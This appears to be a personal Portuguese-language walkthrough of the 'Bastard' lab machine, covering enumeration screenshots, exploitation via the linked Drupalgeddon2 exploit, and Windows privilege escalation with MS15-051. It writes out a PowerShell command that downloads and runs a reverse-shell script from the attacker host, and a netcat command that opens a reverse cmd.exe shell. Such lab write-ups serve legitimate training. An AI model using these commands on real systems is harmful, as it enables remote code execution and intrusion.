Bastard
========================

## Enumeration

UDP Scan

![qownnotes-media-TKkGMV](../../../media/qownnotes-media-TKkGMV.png)

Nmap customizado

![qownnotes-media-oWaOdl](../../../media/qownnotes-media-oWaOdl.png)

Nmap full ports

![qownnotes-media-uKoGxs](../../../media/qownnotes-media-uKoGxs.png)

Obtendo info a respeito do serviço

![qownnotes-media-SxBKCW](../../../media/qownnotes-media-SxBKCW.png)

Scan de vulnerabilidade com o nmap

![qownnotes-media-tONqja](../../../media/qownnotes-media-tONqja.png)

Nikto

![qownnotes-media-GAvzOs](../../../media/qownnotes-media-GAvzOs.png)

RPC 

![qownnotes-media-QYqTzH](../../../media/qownnotes-media-QYqTzH.png)

![qownnotes-media-KBtHKx](../../../media/qownnotes-media-KBtHKx.png)

![qownnotes-media-YKqLpd](../../../media/qownnotes-media-YKqLpd.png)

![qownnotes-media-QLGXZu](../../../media/qownnotes-media-QLGXZu.png)

![qownnotes-media-JbMEFB](../../../media/qownnotes-media-JbMEFB.png)

![qownnotes-media-erSURF](../../../media/qownnotes-media-erSURF.png)

![qownnotes-media-UpzcAj](../../../media/qownnotes-media-UpzcAj.png)

## Exploitation

Esse foi o que funcionou

https://github.com/dreadlocked/Drupalgeddon2

![qownnotes-media-GXFPhy](../../../media/qownnotes-media-GXFPhy.png)

![qownnotes-media-YkhuTD](../../../media/qownnotes-media-YkhuTD.png)

![qownnotes-media-nwKYVc](../../../media/qownnotes-media-nwKYVc.png)

![qownnotes-media-AJgdxi](../../../media/qownnotes-media-AJgdxi.png)


Aqui vale considerar um aprendizado. Eu precisava executar coisas no powershell e não estava conseguindo e por isso eu gerei o seguinte payload:

    C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy ByPass -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.17/3-exploitation/nishang/Shells/shell2.ps1')"

## PrivEsc

    whoami /priv
    
    systeminfo

![qownnotes-media-KSwpsi](../../../media/qownnotes-media-KSwpsi.png)

Essa máquina foi bem interessante, porque eu tentei um exploit várias vezes e não funcionou por algum problema o qual eu não identifiquei qual é. A exploração foi via kernel mesmo, bem tranquil.o, mas é importante achar o exploit adequado para conseguir a escalação de privilégio. O exploit foi obtido da seguinte maneira:

https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip

Baixei na máquina do windows mesmo e mandei para o kali linux o binário x64.

![qownnotes-media-PctSKC](../../../media/qownnotes-media-PctSKC.png)


    copy \\10.10.14.17\smb\ms15-051x64.exe m.exe
    ./m.exe "whoami"

![qownnotes-media-UYzzRh](../../../media/qownnotes-media-UYzzRh.png)

Vale considerar que pelo powershell aqui não foi possível executar a shell reversa, então fomos de netcat mesmo!
    
    ./m.exe "\\10.10.14.17\smb\nc64.exe -e C:\Windows\System32\cmd.exe 10.10.14.17 8083"
    
![qownnotes-media-RcDQpG](../../../media/qownnotes-media-RcDQpG.png)
